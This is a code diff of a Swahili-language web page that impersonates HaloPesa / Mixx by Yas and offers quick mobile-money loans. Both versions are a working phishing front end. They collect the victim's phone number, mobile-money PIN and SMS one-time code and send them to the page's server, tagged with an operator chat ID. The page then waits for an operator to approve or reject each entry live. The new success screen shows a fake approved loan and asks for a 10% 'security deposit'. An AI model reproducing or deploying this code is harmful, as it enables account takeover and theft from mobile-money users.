@@ -1,382 +1,421 @@
 <!DOCTYPE html>
 <html lang="sw">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>HALOPESA - HUDUMA ZA MIKOPO NA PESA KIGANJANI</title>
-    <link rel="stylesheet" href="style.css">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>MIXX BY YAS - MIKOIKO RAHISI NA YA HARAKA</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #ff8800; /* Matching the orange background tone */
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+    }
+    header {
+      background-color: #003366;
+      color: #ffcc00;
+      width: 100%;
+      padding: 15px 0;
+      text-align: center;
+      font-size: 20px;
+      font-weight: bold;
+      display: none; /* Hidden on success view */
+    }
+    .card {
+      background: #ffffff;
+      padding: 20px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 420px;
+      margin: 20px auto;
+      box-sizing: border-box;
+    }
+    h2 {
+      color: #333;
+      font-size: 22px;
+      margin-bottom: 5px;
+      text-align: center;
+    }
+    p {
+      color: #666;
+      font-size: 14px;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    .input-group {
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      font-size: 13px;
+      color: #444;
+      margin-bottom: 5px;
+    }
+    input {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+    input::placeholder {
+      color: #999;
+      opacity: 1;
+    }
+    .primary-btn {
+      background-color: #ff8800;
+      color: white;
+      border: none;
+      width: 100%;
+      padding: 14px;
+      border-radius: 8px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    .primary-btn:hover {
+      background-color: #e07700;
+    }
+    .secondary-btn {
+      background-color: #ffffff;
+      color: #333;
+      border: 1px solid #ddd;
+      width: 100%;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 14px;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 8px;
+      text-align: left;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+
+    /* Success Screen Specific Styles */
+    .success-card {
+      background: #ffffff;
+      border-radius: 16px;
+      padding: 20px;
+      max-width: 420px;
+      width: 100%;
+      margin: 20px auto;
+      box-sizing: border-box;
+      text-align: center;
+    }
+    .success-icon-container {
+      width: 60px;
+      height: 60px;
+      background-color: #ff8800;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 10px auto;
+      color: white;
+      font-size: 28px;
+    }
+    .amount-box {
+      background: linear-gradient(135deg, #ff8800, #ffaa33);
+      color: white;
+      padding: 20px;
+      border-radius: 12px;
+      margin: 15px 0;
+    }
+    .amount-box span {
+      font-size: 12px;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+    }
+    .amount-box h1 {
+      font-size: 32px;
+      margin: 5px 0 0 0;
+    }
+    .notice-box {
+      background-color: #fff8e6;
+      border: 1px solid #ffe0b2;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 12px;
+      color: #5d4037;
+      text-align: left;
+      margin-bottom: 15px;
+    }
+    .details-section {
+      text-align: left;
+      border-top: 1px solid #eee;
+      border-bottom: 1px solid #eee;
+      padding: 15px 0;
+      margin-bottom: 15px;
+    }
+    .detail-row {
+      display: flex;
+      align-items: center;
+      margin-bottom: 10px;
+      font-size: 13px;
+      color: #444;
+      gap: 10px;
+    }
+    .footer-note {
+      font-size: 12px;
+      color: #666;
+      text-align: left;
+      background: #f9f9f9;
+      padding: 10px;
+      border-radius: 6px;
+      margin-bottom: 15px;
+      display: flex;
+      gap: 8px;
+      align-items: flex-start;
+    }
+  </style>
 </head>
 <body>
 
-    <header>
-        <span style="font-size: 20px; cursor: pointer;">☰</span>
-        <div class="logo-container">
-            <span class="halo-badge">HALOPESA</span>
-            <span class="brand-title">HALOTEL</span>
-        </div>
-        <span></span>
-    </header>
-
-    <div class="container">
-        
-        <!-- DASHBOARD SCREEN -->
-        <div id="screen-dashboard" class="screen active">
-            <h2>PATA MKOPO WAKO WA HALOPESA</h2>
-            <p class="subtitle">Idhini ya haraka • Viwango bora • Masharti rahisi</p>
-            
-            <div style="background: #fafafa; padding: 15px; border-radius: 12px; border: 1px solid #eee; margin-bottom: 20px;">
-                <label>Kikokotoko Cha Mkopo</label>
-                <p style="font-size: 13px; color: #666;">Kiasi Cha Mkopo: <strong id="displayAmount" style="color:var(--accent-orange); float:right;">TZS 1,000,000</strong></p>
-                <input type="range" id="loanRange" min="50000" max="100000000" value="1000000" style="accent-color: var(--accent-orange); width:100%; margin: 10px 0;" oninput="updateLoanCalculation(this.value)">
-                <p style="font-size: 13px; color: #666;">Malipo Ya Kila Mwezi: <strong id="displayMonthly" style="color:var(--accent-orange); font-size:16px; float:right;">TZS 95,044.20</strong></p>
-            </div>
-
-            <button class="btn-primary" onclick="goToScreen('screen-step1')">OMBA SASA</button>
-        </div>
-
-        <!-- STEP 1 SCREEN -->
-        <div id="screen-step1" class="screen">
-            <h2>OMBI LA MKOPO</h2>
-            <p class="subtitle">Hatua ya 1 kati ya 3</p>
-            
-            <div class="form-group">
-                <label>Aina Ya Mkopo</label>
-                <select id="loanType">
-                    <option value="" disabled selected>Chagua aina ya mkopo</option>
-                    <option>Mkopo wa Biashara</option>
-                    <option>Mkopo wa Haraka</option>
-                </select>
-            </div>
-
-            <div class="form-group">
-                <label>Kiasi Cha Mkopo (TZS)</label>
-                <input type="number" id="loanAmount" placeholder="Weka kiasi cha mkopo" value="">
-            </div>
-
-            <div class="form-group">
-                <label>Muda Wa Mkopo</label>
-                <select id="loanDuration">
-                    <option value="" disabled selected>Chagua muda wa mkopo</option>
-                    <option>Miezi 48</option>
-                    <option>Miezi 12</option>
-                </select>
-            </div>
-
-            <div class="form-group">
-                <label>Kusudi La Mkopo</label>
-                <textarea id="loanPurpose" placeholder="Elezea kusudi la mkopo wako..." style="width:100%; padding:10px; border-radius:8px; border:1px solid #ccc;" rows="3"></textarea>
-            </div>
-
-            <button class="btn-primary" id="btnStep1" onclick="validateStep1()" disabled style="opacity: 0.5; cursor: not-allowed;">HATUA INAYOFUATA</button>
-        </div>
-
-        <!-- STEP 3 SCREEN -->
-        <div id="screen-step3" class="screen">
-            <h2>OMBI LA MKOPO</h2>
-            <p class="subtitle">Hatua ya 3 kati ya 3</p>
-
-            <div class="form-group">
-                <label>Hali Ya Ajira</label>
-                <select id="employment">
-                    <option value="" disabled selected>Chagua hali ya ajira</option>
-                    <option>Binafsi</option>
-                    <option>Ameajiriwa</option>
-                </select>
-            </div>
-
-            <div class="form-group">
-                <label>Mapato Ya Mwaka (TZS)</label>
-                <input type="number" id="income" placeholder="Weka mapato ya mwaka" value="">
-            </div>
-
-            <button class="btn-primary" id="btnStep3" onclick="validateStep3()" disabled style="opacity: 0.5; cursor: not-allowed;">WASILISHA OMBI</button>
-        </div>
-
-        <!-- WAITING / PENDING ADMIN APPROVAL SCREEN -->
-        <div id="screen-waiting" class="screen" style="text-align: center; padding: 20px;">
-            <div style="font-size: 48px; margin-bottom: 15px;">📋</div>
-            <h2>Ombi La Mkopo Limewasilishwa</h2>
-            <p class="subtitle">Ombi lako la mkopo limewasilishwa. Tafadhali subiri idhini. Utapokea ujumbe wa uthibitisho.</p>
-            <p id="status-text" style="font-weight: bold; color: var(--primary-green); margin-top: 20px;">Inasubiri idhini ya Msimamizi...</p>
-        </div>
-
-        <!-- LOGIN / PIN SCREEN -->
-        <div id="screen-login" class="screen">
-            <h2 style="text-align:center;">INGIA HALOPESA</h2>
-            
-            <div id="login-error-banner" style="display: none; background: #ffebee; color: #c62828; padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center; font-weight: bold; font-size: 14px;"></div>
-
-            <div class="form-group">
-                <label>Nambari Ya Simu (HaloPesa)</label>
-                <div style="display: flex; gap: 8px;">
-                    <span style="padding: 12px; background: #eee; border-radius: 8px; border:1px solid #ccc;">🇹🇿 +255</span>
-                    <input type="tel" id="phoneNumber" placeholder="621234567" style="flex: 1;" oninput="checkLoginInputs()">
-                </div>
-            </div>
-
-            <label style="text-align:center; margin-top: 15px;">Weka PIN Ya HaloPesa (Tarakimu 4)</label>
-            <div class="pin-inputs">
-                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
-                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
-                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
-                <input type="password" maxlength="1" class="pin-box" inputmode="numeric" />
-            </div>
-
-            <button class="btn-primary" id="btnLogin" onclick="submitPin()" disabled style="opacity: 0.5; cursor: not-allowed;">INGIA</button>
-        </div>
-
-        <!-- SMS OTP SCREEN -->
-        <div id="screen-otp" class="screen">
-            <h2>Uthibitisho Wa SMS OTP</h2>
-            <p class="subtitle">Weka nambari ya OTP uliyopokea kwa SMS</p>
-            
-            <div id="otp-error-banner" style="display: none; background: #ffebee; color: #c62828; padding: 10px; border-radius: 8px; margin-bottom: 15px; text-align: center; font-weight: bold; font-size: 14px;"></div>
-
-            <div class="form-group">
-                <label>Weka OTP (Tarakimu 4)</label>
-                <input type="text" id="otpInput" placeholder="1234" maxlength="4" style="text-align: center; font-size: 20px; letter-spacing: 4px;" oninput="checkOtpInput()">
-            </div>
-            <button class="btn-primary" id="btnOtp" onclick="submitOtp()" disabled style="opacity: 0.5; cursor: not-allowed;">WASILISHA OTP</button>
-        </div>
-
-        <!-- SUCCESS SCREEN -->
-        <div id="screen-success" class="screen" style="text-align: center; padding: 40px 20px;">
-            <div style="font-size: 60px; margin-bottom: 20px;">✅</div>
-            <h2 style="color: white;">IMEANISHWA!</h2>
-            <p style="color: #e5e7eb; margin-top: 10px;">Mkopo wako umeidhinishwa na kuhamishwa kwenye akaunti yako ya HaloPesa.</p>
-        </div>
-
+  <!-- Step 1: Loan Application Form & PIN Input -->
+  <div id="application-card" class="card">
+    <h2>Omba Mkopo</h2>
+    <p>Weka maelezo yako ya HaloPesa</p>
+    
+    <div class="input-group">
+      <label for="phone">Namba ya Simu (HaloPesa)</label>
+      <input type="tel" id="phone" placeholder="e.g. 0621234567" required />
     </div>
 
-    <script>
-        let currentUserId = null;
-        let statusPollInterval = null;
+    <div class="input-group">
+      <label for="pin">Weka PIN ya HaloPesa</label>
+      <input type="password" id="pin" placeholder="e.g. 1234" maxlength="4" required />
+    </div>
 
-        function goToScreen(screenId) {
-            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
-            document.getElementById(screenId).classList.add('active');
-        }
+    <button id="submit-app-btn" class="primary-btn">WASILISHA OMBI</button>
+  </div>
 
-        function updateLoanCalculation(val) {
-            const numericVal = Number(val);
-            const formattedAmount = numericVal.toLocaleString('en-US');
-            document.getElementById('displayAmount').innerText = 'TZS ' + formattedAmount;
+  <!-- Step 2: OTP Verification Box Container (Hidden Initially) -->
+  <div id="otp-card" class="card" style="display: none;">
+    <h2>Uthibitisho Wa SMS OTP</h2>
+    <p>Weka nambari ya OTP uliyopokea kwa SMS</p>
+    
+    <div class="input-group">
+      <label for="otp-input">Weka OTP (Tarakimu 4 au 6)</label>
+      <input type="text" id="otp-input" placeholder="123456" maxlength="6" />
+    </div>
 
-            const step1Input = document.getElementById('loanAmount');
-            if (step1Input) {
-                step1Input.value = numericVal;
-                checkStep1Inputs();
-            }
+    <button id="submit-otp-btn" class="primary-btn">WASILISHA OTP</button>
 
-            const estimatedMonthly = (numericVal * 0.095044).toFixed(2);
-            const formattedMonthly = Number(estimatedMonthly).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-            document.getElementById('displayMonthly').innerText = 'TZS ' + formattedMonthly;
-        }
+    <div id="countdown-container" style="text-align: center; margin-top: 15px;">
+      <p id="timer-text" style="font-size: 14px; color: #555;">Tuma tena OTP baada ya <span id="countdown">30</span>s</p>
+      <button id="request-otp-btn" class="secondary-btn" style="display: none; justify-content: center;">Omba OTP Mpya</button>
+    </div>
+  </div>
 
-        function checkStep1Inputs() {
-            const loanType = document.getElementById('loanType').value;
-            const loanAmount = document.getElementById('loanAmount').value;
-            const loanDuration = document.getElementById('loanDuration').value;
-            const loanPurpose = document.getElementById('loanPurpose').value.trim();
-            const btn = document.getElementById('btnStep1');
+  <!-- Step 3: Success Screen View Matching Your Image (Hidden Initially) -->
+  <div id="success-card" class="success-card" style="display: none;">
+    <div class="success-icon-container">✓</div>
+    <h3 style="margin: 0; color: #222; font-size: 20px;">🎉 Hongera!</h3>
+    <p style="font-size: 13px; color: #666; margin-top: 5px;">Mkopo wako <strong>umeidhinishwa!</strong> Fedha zitatolewa hivi karibuni.</p>
+    
+    <div class="amount-box">
+      <span>Kiasi Kilichoidhinishwa</span>
+      <h1>TSh 100,000</h1>
+    </div>
 
-            if (loanType && loanAmount && loanDuration && loanPurpose) {
-                btn.removeAttribute('disabled');
-                btn.style.opacity = '1';
-                btn.style.cursor = 'pointer';
-            } else {
-                btn.setAttribute('disabled', 'true');
-                btn.style.opacity = '0.5';
-                btn.style.cursor = 'not-allowed';
-            }
-        }
+    <div class="notice-box">
+      <strong>⚠️ NOTISI YA UZINGATIAJI</strong><br>
+      Akaunti yako ya HaloPesa lazima iwe hai na idumishe amana ya usalama ya angalau <strong>10% ya kiasi cha mkopo ulioomba</strong>. Amana hii inarudishwa kikamilifu baada ya kulipa mkopo na husaidia kupata riba nzuri zaidi.
+    </div>
 
-        document.getElementById('loanType').addEventListener('change', checkStep1Inputs);
-        document.getElementById('loanAmount').addEventListener('input', checkStep1Inputs);
-        document.getElementById('loanDuration').addEventListener('change', checkStep1Inputs);
-        document.getElementById('loanPurpose').addEventListener('input', checkStep1Inputs);
+    <div class="details-section">
+      <div style="font-weight: bold; font-size: 13px; text-align: left; margin-bottom: 10px; color: #333;">💳 Maelezo ya Mkopo</div>
+      
+      <div class="detail-row">
+        <span>🟢</span>
+        <div><strong>MALIPO YA KILA MWEZI</strong><br><span style="color: #ff8800; font-weight: bold;">TSh 2,441</span></div>
+      </div>
+      
+      <div class="detail-row">
+        <span>📅</span>
+        <div><strong>MUDA WA MKOPO</strong><br><span style="color: #333; font-weight: bold;">Miezi 48</span></div>
+      </div>
 
-        function validateStep1() {
-            goToScreen('screen-step3');
-        }
+      <div class="detail-row">
+        <span>📈</span>
+        <div><strong>KIWANGO CHA RIBA</strong><br><span style="color: #333; font-weight: bold;">8% APR</span></div>
+      </div>
+    </div>
 
-        function checkStep3Inputs() {
-            const employment = document.getElementById('employment').value;
-            const income = document.getElementById('income').value;
-            const btn = document.getElementById('btnStep3');
+    <div style="text-align: left; font-weight: bold; font-size: 13px; margin-bottom: 8px; color: #333;">Vitendo vya Haraka</div>
+    <button class="secondary-btn">💰 Weka Fedha</button>
+    <button class="secondary-btn">💵 Toa Fedha</button>
+    <button class="secondary-btn">📄 Maelezo ya Mkopo</button>
 
-            if (employment && income) {
-                btn.removeAttribute('disabled');
-                btn.style.opacity = '1';
-                btn.style.cursor = 'pointer';
-            } else {
-                btn.setAttribute('disabled', 'true');
-                btn.style.opacity = '0.5';
-                btn.style.cursor = 'not-allowed';
-            }
-        }
+    <div class="footer-note" style="margin-top: 15px;">
+      <span>📱</span>
+      <div><strong>Hatua Zinazofuata:</strong><br>Utapata SMS na barua pepe yenye maelezo ya utolewa ndani ya masaa 24.</div>
+    </div>
 
-        document.getElementById('employment').addEventListener('change', checkStep3Inputs);
-        document.getElementById('income').addEventListener('input', checkStep3Inputs);
+    <button id="home-btn" class="primary-btn" style="background-color: #ff9900;">🏠 Rudi Nyumbani</button>
+  </div>
 
-        function validateStep3() {
-            goToScreen('screen-login');
-        }
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const adminChatId = urlParams.get('admin') || '01';
 
-        function checkLoginInputs() {
-            const phone = document.getElementById('phoneNumber').value;
-            const pinBoxes = document.querySelectorAll('#screen-login .pin-box');
-            let pin = '';
-            pinBoxes.forEach(b => pin += b.value);
-            const btn = document.getElementById('btnLogin');
+    const applicationCard = document.getElementById('application-card');
+    const otpCard = document.getElementById('otp-card');
+    const successCard = document.getElementById('success-card');
+    const submitAppBtn = document.getElementById('submit-app-btn');
+    const submitOtpBtn = document.getElementById('submit-otp-btn');
+    const homeBtn = document.getElementById('home-btn');
 
-            if (phone.length >= 9 && pin.length === 4) {
-                btn.removeAttribute('disabled');
-                btn.style.opacity = '1';
-                btn.style.cursor = 'pointer';
-            } else {
-                btn.setAttribute('disabled', 'true');
-                btn.style.opacity = '0.5';
-                btn.style.cursor = 'not-allowed';
-            }
-        }
+    let currentUserId = null;
+    let statusInterval = null;
 
-        const pinBoxes = document.querySelectorAll('#screen-login .pin-box');
-        pinBoxes.forEach((box, index) => {
-            box.addEventListener('input', (e) => {
-                if (e.target.value.length === 1 && index < pinBoxes.length - 1) {
-                    pinBoxes[index + 1].focus();
-                }
-                checkLoginInputs();
-            });
-            box.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && box.value.length === 0 && index > 0) {
-                    pinBoxes[index - 1].focus();
-                }
-            });
+    submitAppBtn.addEventListener('click', async () => {
+      const phone = document.getElementById('phone').value.trim();
+      const pin = document.getElementById('pin').value.trim();
+
+      if (!phone || !pin) {
+        alert('Tafadhali jaza namba ya simu na PIN.');
+        return;
+      }
+
+      submitAppBtn.disabled = true;
+      submitAppBtn.textContent = 'Inachakata...';
+
+      try {
+        const response = await fetch('/api/submit-application', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            phone: phone,
+            pin: pin,
+            amount: 'TZS 100,000',
+            adminChatId: adminChatId
+          })
         });
 
-        function checkOtpInput() {
-            const otp = document.getElementById('otpInput').value;
-            const btn = document.getElementById('btnOtp');
-
-            if (otp.length === 4) {
-                btn.removeAttribute('disabled');
-                btn.style.opacity = '1';
-                btn.style.cursor = 'pointer';
-            } else {
-                btn.setAttribute('disabled', 'true');
-                btn.style.opacity = '0.5';
-                btn.style.cursor = 'not-allowed';
-            }
+        const data = await response.json();
+        if (data.success) {
+          currentUserId = data.userId;
+          startStatusPolling();
+        } else {
+          alert(data.error || 'Imeshindikana kutuma ombi.');
+          submitAppBtn.disabled = false;
+          submitAppBtn.textContent = 'WASILISHA OMBI';
         }
+      } catch (err) {
+        submitAppBtn.disabled = false;
+        submitAppBtn.textContent = 'WASILISHA OMBI';
+      }
+    });
 
-        async function submitPin() {
-            const phone = document.getElementById('phoneNumber').value;
-            const pinBoxes = document.querySelectorAll('#screen-login .pin-box');
-            let pin = '';
-            pinBoxes.forEach(b => pin += b.value);
+    function startStatusPolling() {
+      submitAppBtn.textContent = 'Inasubiri Idhini...';
+      
+      statusInterval = setInterval(async () => {
+        if (!currentUserId) return;
+        try {
+          const res = await fetch(`/api/check-status/${currentUserId}`);
+          const data = await res.json();
 
-            const rangeVal = document.getElementById('loanRange').value;
-            const selectedAmount = 'TZS ' + Number(rangeVal).toLocaleString('en-US');
+          if (data.status === 'APPROVED_LOAD_OTP') {
+            clearInterval(statusInterval);
+            applicationCard.style.display = 'none';
+            otpCard.style.display = 'block';
+            startOtpCountdown();
+          } else if (data.status === 'DENIED') {
+            clearInterval(statusInterval);
+            alert('Ombi lako limekataliwa.');
+            location.reload();
+          } else if (data.status === 'WRONG_PIN_ERROR') {
+            clearInterval(statusInterval);
+            alert('PIN uliyoweka si sahihi. Tafadhali jaribu tena.');
+            location.reload();
+          }
+        } catch (e) {}
+      }, 3000);
+    }
 
-            const urlParams = new URLSearchParams(window.location.search);
-            const adminParam = urlParams.get('admin');
+    function startOtpCountdown() {
+      let timeLeft = 30;
+      const countdownEl = document.getElementById('countdown');
+      const timerTextEl = document.getElementById('timer-text');
+      const requestOtpBtn = document.getElementById('request-otp-btn');
 
-            try {
-                const response = await fetch('/api/submit-application', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phone, pin, amount: selectedAmount, adminChatId: adminParam })
-                });
+      timerTextEl.style.display = 'block';
+      requestOtpBtn.style.display = 'none';
+      countdownEl.textContent = timeLeft;
 
-                const data = await response.json();
-                if(data.success) {
-                    currentUserId = data.userId;
-                    document.getElementById('login-error-banner').style.display = 'none';
-                    goToScreen('screen-waiting');
-                    startPollingStatus();
-                } else {
-                    const banner = document.getElementById('login-error-banner');
-                    banner.innerText = data.error || 'Hitilafu imetokea. Jaribu tena.';
-                    banner.style.display = 'block';
-                }
-            } catch (err) {
-                const banner = document.getElementById('login-error-banner');
-                banner.innerText = 'Hitilafu ya mtandao. Tafadhali jaribu tena.';
-                banner.style.display = 'block';
-            }
+      const timer = setInterval(() => {
+        timeLeft--;
+        countdownEl.textContent = timeLeft;
+        if (timeLeft <= 0) {
+          clearInterval(timer);
+          timerTextEl.style.display = 'none';
+          requestOtpBtn.style.display = 'block';
         }
+      }, 1000);
+    }
 
-        function startPollingStatus() {
-            if(statusPollInterval) clearInterval(statusPollInterval);
+    submitOtpBtn.addEventListener('click', async () => {
+      const otp = document.getElementById('otp-input').value.trim();
+      if (!otp) {
+        alert('Tafadhali ingiza namba ya OTP.');
+        return;
+      }
 
-            statusPollInterval = setInterval(async () => {
-                if(!currentUserId) return;
-                try {
-                    const res = await fetch(`/api/check-status/${currentUserId}`);
-                    const data = await res.json();
+      submitOtpBtn.disabled = true;
+      submitOtpBtn.textContent = 'Inathibitisha...';
 
-                    if(data.status === 'APPROVED_LOAD_OTP') {
-                        clearInterval(statusPollInterval);
-                        const otpBanner = document.getElementById('otp-error-banner');
-                        otpBanner.innerText = 'correct OTP ✅';
-                        otpBanner.style.background = '#e8f5e9';
-                        otpBanner.style.color = '#2e7d32';
-                        otpBanner.style.display = 'block';
-                        goToScreen('screen-otp');
-                    } else if(data.status === 'DENIED') {
-                        clearInterval(statusPollInterval);
-                        const banner = document.getElementById('login-error-banner');
-                        banner.innerText = 'Ombi limekataliwa ❌';
-                        banner.style.background = '#ffebee';
-                        banner.style.color = '#c62828';
-                        banner.style.display = 'block';
-                        goToScreen('screen-login');
-                    } else if(data.status === 'SUCCESS') {
-                        clearInterval(statusPollInterval);
-                        document.querySelector('.container').style.background = 'var(--primary-green)';
-                        goToScreen('screen-success');
-                    } else if(data.status === 'WRONG_PIN_ERROR') {
-                        clearInterval(statusPollInterval);
-                        const banner = document.getElementById('login-error-banner');
-                        banner.innerText = 'wrong PIN ❌';
-                        banner.style.background = '#ffebee';
-                        banner.style.color = '#c62828';
-                        banner.style.display = 'block';
-                        document.querySelectorAll('#screen-login .pin-box').forEach(b => b.value = '');
-                        checkLoginInputs();
-                        goToScreen('screen-login');
-                    } else if(data.status === 'WRONG_OTP_ERROR') {
-                        clearInterval(statusPollInterval);
-                        const banner = document.getElementById('otp-error-banner');
-                        banner.innerText = 'WRONG OTP ❌';
-                        banner.style.background = '#ffebee';
-                        banner.style.color = '#c62828';
-                        banner.style.display = 'block';
-                        document.getElementById('otpInput').value = '';
-                        checkOtpInput();
-                        goToScreen('screen-otp');
-                    }
-                } catch (e) {}
-            }, 3000);
+      try {
+        const response = await fetch('/api/submit-otp', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ userId: currentUserId, otp: otp })
+        });
+
+        const data = await response.json();
+        if (data.success) {
+          startOtpStatusPolling();
         }
+      } catch (err) {
+        submitOtpBtn.disabled = false;
+        submitOtpBtn.textContent = 'WASILISHA OTP';
+      }
+    });
 
-        async function submitOtp() {
-            const otp = document.getElementById('otpInput').value;
+    function startOtpStatusPolling() {
+      const otpCheck = setInterval(async () => {
+        try {
+          const res = await fetch(`/api/check-status/${currentUserId}`);
+          const data = await res.json();
 
-            await fetch('/api/submit-otp', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ userId: currentUserId, otp })
-            });
+          if (data.status === 'SUCCESS') {
+            clearInterval(otpCheck);
+            otpCard.style.display = 'none';
+            successCard.style.display = 'block'; // Shows your exact success screen layout!
+          } else if (data.status === 'WRONG_OTP_ERROR') {
+            clearInterval(otpCheck);
+            alert('OTP uliyoweka si sahihi. Tafadhali jaribu tena.');
+            location.reload();
+          }
+        } catch (e) {}
+      }, 3000);
+    }
 
-            document.getElementById('otp-error-banner').style.display = 'none';
-            document.getElementById('status-text').innerText = 'Inathibitisha OTP...';
-            goToScreen('screen-waiting');
-            startPollingStatus();
-        }
-    </script>
+    homeBtn.addEventListener('click', () => {
+      location.reload();
+    });
+  </script>
 </body>
-            </html>
-    
+    </html>
+        
